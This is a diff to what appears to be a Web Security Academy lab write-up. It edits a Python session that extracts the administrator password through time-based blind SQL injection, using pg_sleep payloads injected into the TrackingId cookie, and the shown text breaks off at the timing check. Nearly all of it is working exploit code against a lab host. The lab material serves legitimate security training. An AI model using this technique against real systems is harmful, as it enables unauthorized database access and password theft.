@@ -117,18 +117,16 @@ Python 3.7.5 (default, Nov 20 2019, 09:21:52)
 Type "help", "copyright", "credits" or "license" for more information.
 >>> import requests
 >>> session = requests.session()
->>> payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
 >>> length = range(1,7)
 >>> char = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
 >>> url = "https://ac7d1f2f1f53d9aa806349cd00b20079.web-security-academy.net/"
->>> r = requests.get(url) # ignore this line since its not even gonna be used (my bad)
 >>> payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
 >>> for num in length:
 ...     for c in char:
-...             p1 = payload.replace("§1§", str(num))
-...             p2 = p1.replace("§a§", c)
+...             p = payload.replace("§1§", str(num))
+...             p = p.replace("§a§", c)
 ...             cookies = session.cookies.set('TrackingId', None)
-...             cookies = session.cookies.set('TrackingId', p2)
+...             cookies = session.cookies.set('TrackingId', p)
 ...             response = session.get(url)
 ...             time = response.elapsed.total_seconds()
 ...             if time >= 10:
